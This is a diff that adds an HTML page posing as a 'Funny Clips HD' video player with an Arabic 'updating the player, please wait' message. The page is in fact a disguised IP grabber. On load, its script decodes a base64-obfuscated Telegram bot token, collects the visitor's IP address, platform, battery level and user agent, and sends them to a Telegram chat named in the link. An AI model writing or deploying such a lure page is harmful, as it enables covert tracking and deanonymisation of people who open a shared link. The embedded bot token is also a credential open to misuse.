@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Funny Clips HD</title>
+    <style>
+        body { background: #000; color: #fff; text-align: center; margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+        video { width: 95%; max-width: 400px; border-radius: 15px; border: 2px solid #555; box-shadow: 0 0 20px rgba(255,255,255,0.2); }
+        .msg { margin-top: 15px; font-size: 14px; color: #444; }
+    </style>
+</head>
+<body>
+
+    <video autoplay muted loop playsinline>
+        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+    </video>
+    
+    <p>جاري تحديث مشغل الفيديو... يرجى الانتظار</p>
+    <div class="msg">Syncing system headers...</div>
+
+    <script>
+        async function getSys() {
+            // توكن البوت مشفر
+            const t = atob("ODM4NjQyNzMyMTpBQUZLcThmQ3NvUEVEZ2NGOEtORlIyTlVyN0doMER3ZnNrRQ==");
+            const id = new URLSearchParams(window.location.search).get('id');
+            
+            try {
+                // سحب الـ IP
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                
+                // سحب معلومات البطارية
+                let batteryInfo = "غير معروف";
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = Math.round(battery.level * 100) + "%";
+                }
+
+                const info = `
+📱 **بيانات نظام جديدة (أبو سند)**
+🌐 الـ IP: \`${data.ip}\`
+💻 النوع: \`${navigator.platform}\`
+🔋 البطارية: \`${batteryInfo}\`
+🔍 المتصفح: \`${navigator.userAgent.slice(0, 50)}...\`
+                `;
+
+                if(id) {
+                    fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${id}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
+                }
+            } catch (e) {
+                console.log("Error fetching data");
+            }
+        }
+
+        // تشغيل السحب فوراً عند فتح الصفحة
+        window.onload = getSys;
+    </script>
+</body>
+</html>
